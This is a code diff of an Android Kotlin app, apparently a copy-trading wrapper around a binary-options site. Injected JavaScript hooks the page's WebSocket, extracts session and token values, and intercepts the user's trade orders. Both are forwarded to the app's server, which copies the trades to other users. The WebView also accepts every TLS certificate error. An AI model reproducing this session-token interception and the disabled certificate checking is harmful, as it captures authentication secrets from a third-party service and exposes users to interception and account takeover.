@@ -55,9 +55,11 @@ class MainActivity : AppCompatActivity() {
     (function() {
         if (window.__oscarEarlyHook) return;
         window.__oscarEarlyHook = true;
+
         function extractAndSend(text) {
             try {
                 if (typeof text !== 'string' || text.length < 5) return;
+                // استخراج SSID
                 var pats = [ /"session"\s*:\s*"([^"]+)"/, /"token"\s*:\s*"([^"]+)"/ ];
                 for (var i = 0; i < pats.length; i++) {
                     var m = text.match(pats[i]);
@@ -67,8 +69,26 @@ class MainActivity : AppCompatActivity() {
                         }
                     }
                 }
+                // اعتراض الصفقات
+                if (text.indexOf('"buy"') !== -1 || text.indexOf('"order"') !== -1) {
+                    try {
+                        var data = JSON.parse(text);
+                        if (data && data.asset && data.direction && data.amount && data.duration) {
+                            var trade = {
+                                asset: data.asset,
+                                direction: data.direction,
+                                amount: data.amount,
+                                expiry: data.duration
+                            };
+                            if (window.OscarBridge && window.OscarBridge.onTrade) {
+                                window.OscarBridge.onTrade(JSON.stringify(trade));
+                            }
+                        }
+                    } catch(e) {}
+                }
             } catch(e) {}
         }
+
         var OWS = window.WebSocket;
         if (OWS) {
             var HookedWS = function(url, protocols) {
@@ -176,7 +196,6 @@ class MainActivity : AppCompatActivity() {
                     .post("password=$password".toRequestBody("application/x-www-form-urlencoded".toMediaType()))
                     .build()
                 val res = client.newCall(req).execute()
-                // إذا أعادنا 200 أو 302، فهذا يعني نجاح الدخول
                 if (res.isSuccessful || res.code == 302) {
                     withContext(Dispatchers.Main) { onResult(true, "OK") }
                 } else {
@@ -288,8 +307,6 @@ class MainActivity : AppCompatActivity() {
             override fun onReceivedSslError(v: WebView?, h: SslErrorHandler?, e: android.net.http.SslError?) { h?.proceed() }
             
             override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
-                val url = request?.url.toString()
-                // إذا حاول فتح رابط خارجي، نتركه يتصرف بشكل افتراضي
                 return false
             }
 
@@ -307,17 +324,13 @@ class MainActivity : AppCompatActivity() {
 
             override fun onReceivedError(view: WebView?, request: WebResourceRequest?, error: WebResourceError?) {
                 super.onReceivedError(view, request, error)
-                val errorCode = error?.errorCode
-                val failingUrl = request?.url.toString()
-                
-                // معالجة خطأ ERR_NAME_NOT_RESOLVED (رمز الخطأ -2)
-                if (errorCode == WebViewClient.ERROR_HOST_LOOKUP) {
-                    lastFailedUrl = failingUrl
+                if (error?.errorCode == WebViewClient.ERROR_HOST_LOOKUP) {
+                    lastFailedUrl = request?.url.toString()
                     statusBar.text = "⚠️ فشل الاتصال، جاري إعادة المحاولة..."
-                    // إعادة المحاولة بعد ثانية واحدة
                     Handler(Looper.getMainLooper()).postDelayed({
-                        if (lastFailedUrl != null) {
-                            view?.loadUrl(lastFailedUrl)
+                        val urlToRetry = lastFailedUrl
+                        if (urlToRetry != null) {
+                            view?.loadUrl(urlToRetry)
                             lastFailedUrl = null
                         }
                     }, 1500)
@@ -326,7 +339,7 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun sendToServer(ssid: String) {
+    private fun sendSsidToServer(ssid: String) {
         if (isProcessingSSID || ssid.length < 25) return
         isProcessingSSID = true
         statusBar.text = "🔄 جاري ربط حساب الماستر..."
@@ -365,13 +378,47 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    private fun sendTradeToServer(tradeJson: String) {
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val payload = JSONObject(tradeJson)
+                val req = Request.Builder()
+                    .url("$BASE_URL/api/admin/realtime_trade")
+                    .post(payload.toString().toRequestBody("application/json".toMediaType()))
+                    .build()
+                val res = client.newCall(req).execute()
+                val json = JSONObject(res.body?.string() ?: "{}")
+                withContext(Dispatchers.Main) {
+                    if (json.optBoolean("ok")) {
+                        Toast.makeText(this@MainActivity, "✅ تم نسخ الصفقة إلى ${json.optInt("copied")} مستخدم", Toast.LENGTH_SHORT).show()
+                    } else {
+                        Toast.makeText(this@MainActivity, "⚠️ فشل نسخ الصفقة: ${json.optString("error")}", Toast.LENGTH_SHORT).show()
+                    }
+                }
+            } catch (e: Exception) {
+                withContext(Dispatchers.Main) {
+                    Toast.makeText(this@MainActivity, "خطأ اتصال: ${e.message}", Toast.LENGTH_SHORT).show()
+                }
+            }
+        }
+    }
+
     inner class Bridge {
         @JavascriptInterface
         fun onSsid(ssid: String) {
             if (ssid.length < 25) return
             runOnUiThread {
                 if (currentTab == "market" && !isProcessingSSID) {
-                    sendToServer(ssid)
+                    sendSsidToServer(ssid)
+                }
+            }
+        }
+
+        @JavascriptInterface
+        fun onTrade(tradeJson: String) {
+            runOnUiThread {
+                if (currentTab == "market") {
+                    sendTradeToServer(tradeJson)
                 }
             }
         }
@@ -386,7 +433,6 @@ class MainActivity : AppCompatActivity() {
         webView.clearHistory()
         webView.loadUrl("about:blank")
         isLoggedIn = false
-        // إعادة تشغيل التطبيق لطلب كلمة المرور
         val intent = Intent(this, MainActivity::class.java)
         finish()
         startActivity(intent)
